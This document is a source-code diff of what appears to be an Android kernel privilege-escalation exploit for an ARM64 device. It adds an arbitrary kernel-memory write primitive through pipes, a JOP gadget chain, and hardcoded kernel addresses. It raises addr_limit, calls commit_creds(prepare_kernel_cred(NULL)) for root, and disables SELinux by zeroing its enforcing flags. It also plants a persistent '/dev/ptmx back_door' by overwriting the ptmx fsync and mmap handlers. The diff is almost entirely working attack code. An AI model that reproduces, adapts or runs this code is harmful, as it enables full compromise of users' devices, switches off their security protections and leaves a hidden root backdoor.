@@ -12,6 +12,8 @@
 #include <sys/resource.h>
 #include <fcntl.h>
 #include "mm.h"
+#include "threadinfo.h"
+
 
 #define UDP_SERVER_PORT (5105)
 #define MEMMAGIC (0xDEADBEEF)
@@ -48,6 +50,31 @@ end:
 	close(pipes[1]);
 	close(pipes[0]);
 	return ret;
+}
+
+int write_at_address_pipe(void* address, void* buf, ssize_t len)
+{
+	int ret = 1;
+	int pipes[2];
+
+	if(pipe(pipes))
+		return 1;
+
+	if(write(pipes[1], buf, len) != len)
+		goto end;
+	if(read(pipes[0], address, len) != len)
+		goto end;
+
+	ret = 0;
+end:
+	close(pipes[1]);
+	close(pipes[0]);
+	return ret;
+}
+
+inline int writel_at_address_pipe(void* address, unsigned long val)
+{
+	return write_at_address_pipe(address, &val, sizeof(val));
 }
 
 static void* readpipe(void* param)
@@ -304,9 +331,9 @@ do_comitcred()
 	void *(*prepare_kernel_cred)(void *) ;
 	int (*commit_creds)(void *) ;
 	void (*reset_security_ops)(void *);
-    prepare_kernel_cred = 0xffffffc0000c1b30;
-    commit_creds = 0xffffffc0000c17d0;
-	reset_security_ops = 0xffffffc00023d3d0;
+    prepare_kernel_cred = (void *)0xffffffc0000c1b30;
+    commit_creds = (void *)0xffffffc0000c17d0;
+	reset_security_ops = (void *)0xffffffc00023d3d0;
 	reset_security_ops(NULL);
     return commit_creds(prepare_kernel_cred(NULL));
 
@@ -326,13 +353,22 @@ do_mmap(struct file *filp, struct vm_area_struct *vma)
 {
   remap_pfn_range_func_t func = (void *)0xffffffc000151ebc;
 
-  return func(vma, vma->vm_start, 0x80000 >> 12 , vma->vm_end - vma->vm_start, vma->vm_page_prot);
+  return func(vma, vma->vm_start, 0x80080000 >> 12 , vma->vm_end - vma->vm_start, vma->vm_page_prot);
 }
 
 int
 sizeof_do_mmap(void)
 {
   return (void *)sizeof_do_mmap - (void *)do_mmap;
+}
+
+void preparejop(void** addr, void* jopret)
+{
+	unsigned int i;
+	for(i = 0; i < (0x1000 / sizeof(int)); i++)
+		((int*)addr)[i] = 0xDEAD;
+
+	addr[4] = jopret; //[x0, 0x20]
 }
 
 #if !(__LP64__)
@@ -344,7 +380,7 @@ int getroot(long addr)
 	return ret;
 }
 #else
-int getroot(struct offsets* o)
+int getroot(long o)
 {
 	int ret = 1;
 	int dev;
@@ -356,12 +392,12 @@ int getroot(struct offsets* o)
 		return -ENOMEM;
 
 	printf("[+] Installing JOP\n");
-	if(write_at_address(o->check_flags, (unsigned long)o->joploc))
+	if(write_at_address( (void *)(o +(20 * sizeof(void*))) , 0xffffffc00025A548))
 		goto end2;
 
-	sidtab = o->sidtab;
-	policydb = o->policydb;
-	preparejop(jopdata, o->jopret);
+	//sidtab = o->sidtab;
+	//policydb = o->policydb;
+	preparejop(jopdata, (void *)0xffffffc00017a0cc);
 	if((dev = open("/dev/ptmx", O_RDWR)) < 0)
 		goto end2;
 
@@ -374,19 +410,36 @@ int getroot(struct offsets* o)
 	if(write_at_address(&ti->addr_limit, -1))
 		goto end;
 	printf("[+] Removing JOP\n");
-	if(writel_at_address_pipe(o->check_flags, 0))
+	
+	int zero = 0;
+	if(write_at_address_pipe( (void *)(o +(20 * sizeof(void*))) , &zero, sizeof(zero)))
 		goto end;
 
-	if((ret = modify_task_cred_uc(ti)))
-		goto end;
+	//if((ret = modify_task_cred_uc(ti)))
+	//	goto end;
 
 	//Z5 has domain auto trans from init to init_shell (restricted) so disable selinux completely
 	{
-		int zero = 0;
-		if(o->selinux_enabled)
-			write_at_address_pipe(o->selinux_enabled, &zero, sizeof(zero));
-		if(o->selinux_enforcing)
-			write_at_address_pipe(o->selinux_enforcing, &zero, sizeof(zero));
+
+
+		write_at_address_pipe((void*)0xffffffc00112d19c, &zero, sizeof(zero));  //selinux_enforcing
+		write_at_address_pipe((void*)0xffffffc000f3c780, &zero, sizeof(zero));  //selinux_enabled
+
+		
+		int cred = 0;
+		long comit = 0xffffffbc03ffff00;
+		long dom   = 0xffffffbc03fffe00;
+		
+		printf("[+] Install ptmx back_door\n");
+		writel_at_address_pipe((void*)0xFFFFFFC0011DA518, 0xffffffbc03ffff00); //ptmx fsync
+		writel_at_address_pipe((void*)0xFFFFFFC0011DA4F8, 0xffffffbc03fffe00); //ptmx mmap
+		
+		write_at_address_pipe(	(void*)comit, &do_comitcred, sizeof_do_comitcred());
+		write_at_address_pipe(	(void*)dom, &do_mmap, sizeof_do_mmap());
+		
+		fsync(dev); // get root
+		
+		
 	}
 
 	ret = 0;
@@ -408,7 +461,7 @@ int main(int argc, char* argv[])
 	char *endp;
 
 	//struct offsets* o;
-  addr = 0xc12f9268 + 0x38;
+  addr = 0xffffffc0011da4a8;
   if (argc == 2) {
  	 addr = strtoul(argv[1], &endp, 0);
 	  if (*endp != '\0') {
